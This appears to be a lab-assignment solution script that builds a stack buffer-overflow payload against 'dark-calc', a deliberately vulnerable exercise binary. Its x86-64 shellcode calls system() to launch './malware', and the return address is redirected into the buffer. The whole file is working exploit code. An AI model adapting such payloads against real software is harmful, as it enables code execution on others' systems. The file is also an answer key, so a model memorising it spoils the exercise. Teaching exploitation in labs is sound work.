#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

Buffer overflow in input(): gets() reads into expression[] (16 bytes at
rbp-0x10); the saved return address is 24 bytes above the buffer.  dark-calc
maps its stack RWX at a fixed address (init_fixed_stack, base
0x721000000000 + 0x801000), so the return address can point back into the
buffer and the bytes there are executed.

The stack code runs `system("./malware")`; the working directory is attack/,
so the bomb sees dark-calc as an ancestor and reports success.

    expression[] = 0x721000800fd0
    [ +0  .. +24)  shellcode
    [ +24 .. +32)  return address = 0x721000800fd0
    [ +32 .. +42)  "./malware\0"   (rsp points here on entry)

Only 0x30 bytes separate expression[] from the guard page, so the shellcode
first drops rsp by 0x60: otherwise system()'s own frame would overwrite the
shellcode bytes while it runs.  `mov eax, 0x4017e0` zero-extends, which keeps
the call sequence inside 24 bytes.
"""
import struct
import sys

EXPR = 0x721000800FD0       # input()'s expression[16] on the fixed stack
SYSTEM_PLT = 0x4017E0


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


shellcode = b""
shellcode += b"\x48\x89\xe7"                    # mov  rdi, rsp   (-> "./malware")
shellcode += b"\x48\x83\xec\x60"                # sub  rsp, 0x60  (clear of payload)
shellcode += b"\xb8" + struct.pack("<I", SYSTEM_PLT)  # mov eax, system@plt
shellcode += b"\xff\xd0"                        # call rax
shellcode += b"\xb8\x3c\x00\x00\x00"            # mov  eax, 60 (exit)
shellcode += b"\x31\xff"                        # xor  edi, edi
shellcode += b"\x0f\x05"                        # syscall
shellcode += b"\x90"                            # pad to the return-address slot
assert len(shellcode) == 24, len(shellcode)

payload = shellcode + p64(EXPR) + b"./malware\x00"
sys.stdout.buffer.write(payload)
